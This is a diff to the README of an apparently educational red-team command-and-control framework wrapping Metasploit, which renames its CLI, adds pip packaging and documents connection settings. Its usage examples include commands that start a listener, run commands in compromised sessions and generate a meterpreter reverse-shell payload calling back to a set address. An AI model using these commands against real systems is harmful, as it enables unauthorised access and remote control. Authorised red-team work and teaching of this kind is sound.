@@ -15,7 +15,7 @@
 
 [![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
 [![Python](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/)
-[![Tests](https://img.shields.io/badge/tests-37%20passing-brightgreen.svg)](tests/)
+[![Tests](https://img.shields.io/badge/tests-48%20passing-brightgreen.svg)](tests/)
 [![Status](https://img.shields.io/badge/status-experimental-orange.svg)](#roadmap)
 [![Made by](https://img.shields.io/badge/made%20by-d3vn0mi-black.svg)](https://github.com/d3vn0mi)
 
@@ -29,7 +29,7 @@
 
 RyoTenkai is an early-stage, education / red-team **Command-and-Control (C2) framework**. It has two faces:
 
-1. **`rtk` — the Metasploit CLI** (`ryotenkai.py`). A clean, layered, unit-tested wrapper over `pymetasploit3`. Run modules, poll jobs/sessions, drive sessions, generate payloads — either as one-shot subcommands that emit JSON (Ansible-friendly) or through an `msfconsole`-style interactive REPL. **This is the mature part of the project.**
+1. **`ryo` — the Metasploit CLI** (`ryotenkai.py`). A clean, layered, unit-tested wrapper over `pymetasploit3`. Run modules, poll jobs/sessions, drive sessions, generate payloads — either as one-shot subcommands that emit JSON (Ansible-friendly) or through an `msfconsole`-style interactive REPL. **This is the mature part of the project.**
 2. **The Django C2 server** (`ryotenkai_gui/`). A dashboard + REST API that manages beacons on target hosts, assigns shell tasks, and tracks Metasploit jobs/sessions. **Work in progress** — see the [roadmap](#roadmap) and [known gaps](#known-gaps).
 
 This repo is four loosely-coupled pieces, not one integrated app. Maturity varies — the table below is honest about it.
@@ -56,24 +56,27 @@ The CLI is the fastest way to see RyoTenkai working. You need a reachable `msfrp
 git clone https://github.com/d3vn0mi/RyoTenkai.git
 cd RyoTenkai
 
-# 2. Install CLI deps (pymetasploit3, prompt_toolkit, pytest)
+# 2. Install (exposes the `ryo` command). --no-deps if deps are already present.
 python3 -m venv venv && source venv/bin/activate
-pip install -r requirements.txt
+pip install -e .
 
-# 3. Point config.ini [default] at your msfrpcd (host/port/password/ssl)
+# 3. Point config.ini [default] at your msfrpcd (host/port/password/ssl),
+#    or export RTK_RPC_* env vars (see Configuration).
 
 # 4. Start the Metasploit RPC daemon (or run your own)
-python ryotenkai.py start_rpc
+ryo start_rpc
 
 # 5. Drop into the interactive console
-python ryotenkai.py interactive
+ryo interactive
 ```
+
+Every command is available as `ryo <subcommand>` after install, or run in place with `python ryotenkai.py <subcommand>` — they are equivalent.
 
 Run the test suite (mock RPC — no live msfrpcd needed):
 
 ```sh
-pip install -r requirements.txt
-pytest                     # 37 passing; pytest.ini disables a broken global plugin
+pip install -e ".[test]"   # or: pip install -r requirements.txt
+pytest                     # 48 passing; pytest.ini disables a broken global plugin
 ```
 
 ---
@@ -89,21 +92,21 @@ The CLI has two modes that share one data layer:
 
 ```sh
 # Run any module via a console (run -j) and get structured output
-python ryotenkai.py run_module multi/handler --option LHOST=10.0.0.1 --option LPORT=4444
+ryo run_module multi/handler --option LHOST=10.0.0.1 --option LPORT=4444
 #   options accept OPTION=VALUE (preferred) or "OPTION VALUE"
 
 # Poll active jobs / sessions (JSON)
-python ryotenkai.py get_jobs
-python ryotenkai.py get_sessions
+ryo get_jobs
+ryo get_sessions
 
 # Run command(s) inside an existing session
-python ryotenkai.py run_command 4 "whoami" "id"
+ryo run_command 4 "whoami" "id"
 
 # Generate a payload with msfvenom
-python ryotenkai.py generate_payload elf linux/x64/meterpreter/reverse_tcp 10.0.0.1 4444 out.elf
+ryo generate_payload elf linux/x64/meterpreter/reverse_tcp 10.0.0.1 4444 out.elf
 
 # Launch the Metasploit RPC daemon
-python ryotenkai.py start_rpc
+ryo start_rpc
 ```
 
 Every subcommand above writes JSON to stdout — pipe it straight into `jq` or an Ansible task.
@@ -111,7 +114,7 @@ Every subcommand above writes JSON to stdout — pipe it straight into `jq` or a
 ### Interactive REPL
 
 ```sh
-python ryotenkai.py interactive
+ryo interactive
 ```
 
 An `msfconsole`-style console over a persistent RPC client (command history at `~/.rtk_history`):
@@ -150,7 +153,14 @@ rpc_ssl      = True
 
 Per-subcommand sections (`[run_module]`, `[generate_payload]`, …) hold reusable option presets.
 
-> ⚠️ **Known config caveat:** `rpc_ssl` in `config.ini` is **not** currently wired through — `--rpc-ssl` is a flag that defaults off, so pass `--rpc-ssl` explicitly until [Phase 1](#roadmap) fixes the precedence. Any flag you pass on the command line overrides the config value.
+**Connection precedence** (resolved by `resolve_conn`): `--rpc-* flag` > env var > `config.ini [default]` > built-in default. The env vars are `RTK_RPC_PASSWORD`, `RTK_RPC_SERVER`, `RTK_RPC_PORT`, `RTK_RPC_SSL`:
+
+```sh
+export RTK_RPC_PASSWORD=s3cret RTK_RPC_SERVER=10.0.0.9 RTK_RPC_PORT=55559
+ryo --rpc-ssl get_jobs        # force SSL on for this run; --no-rpc-ssl forces it off
+```
+
+> ℹ️ SSL is now config/env-driven (the old "`rpc_ssl` is ignored" caveat is fixed). Force it per-run with `--rpc-ssl` / `--no-rpc-ssl`. Note: `ryo` reads `./config.ini` from the **current directory** — when running from elsewhere, supply connection settings via the `RTK_RPC_*` env vars (they work from anywhere).
 
 ---
 
@@ -187,8 +197,8 @@ The tree has real cross-file mismatches (being worked through on the roadmap):
 
 Reality-based and phased. ✅ = done, the rest is planned.
 
-- **✅ Phase 0 — CLI foundation:** layered architecture, interactive REPL, 37-test suite, JSON stdout contract, config-key fix.
-- **Phase 1 — Packaging & config:** `pip install`, `rtk` console entrypoint, single source of truth for connection params (CLI > env > config > default), wire `rpc_ssl` from config.
+- **✅ Phase 0 — CLI foundation:** layered architecture, interactive REPL, JSON stdout contract, config-key fix.
+- **✅ Phase 1 — Packaging & config:** `pip install` with the `ryo` console entrypoint, single source of truth for connection params (`resolve_conn`: CLI > env > config > default), `rpc_ssl` honored from config/env (48-test suite).
 - **Phase 2 — RPC perf & reliability:** persistent client reuse, adaptive (non-fixed) polling, reconnect/timeout handling, cached jobs/sessions.
 - **Phase 3 — REPL UX:** live module/option tab-completion (queried from msf), `search`, colored output, history search, sharper errors.
 - **Phase 4 — Metasploit coverage:** `info`, kill/upgrade sessions, db/creds/loot read.
@@ -201,7 +211,7 @@ Detailed CLI design: [`docs/superpowers/specs/2026-06-16-ryotenkai-cli-optimizat
 ## Project layout
 
 ```
-ryotenkai.py            # rtk CLI + interactive REPL (the mature core)
+ryotenkai.py            # ryo CLI + interactive REPL (the mature core)
 agent.py                # beacon agent (target-side)
 ryotenkai_c2.py         # Flask C2 prototype (legacy)
 config.ini              # CLI connection + per-command presets
